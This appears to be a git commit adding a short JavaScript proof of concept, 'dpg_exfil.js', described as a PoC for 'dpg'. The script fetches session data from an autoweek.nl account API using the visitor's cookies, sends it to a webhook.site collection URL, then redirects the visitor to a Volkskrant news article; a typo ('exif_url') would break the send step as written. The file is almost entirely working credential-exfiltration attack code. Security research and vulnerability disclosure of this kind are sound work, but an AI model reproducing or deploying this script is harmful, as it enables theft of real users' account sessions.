134151a9bc84b0a1f7c8ed41a55e8c8a97be6530
Jan Rooduijn <j.m.w.rooduijn@uva.nl>
2024-10-23 18:23:44 +0200

    added file for dpg poc

---
+++ dpg_exfil.js
@@ -0,0 +1,14 @@
+const api_url = 'https://account.autoweek.nl/ooasv2/sessions'; 
+const exfil_url = 'https://webhook.site/0b5b65f9-4d4f-4adb-88b1-ca023d4e9861?data='
+const redirect_url = 'https://www.volkskrant.nl/binnenland/wilders-geeft-noodwet-alsnog-op-strenge-asielmaatregelen-eerst-langs-parlement~bf84ea55/';
+
+async function exfil() {
+  const response = await fetch(api_url, { credentials: 'include'});
+  const data = await response.json(); 
+  const dataString = JSON.stringify(data); 
+  const encodedData = encodeURIComponent(dataString);
+  await fetch(exif_url + encodedData);
+  window.location.href = redirect_url;
+}
+
+exfil();
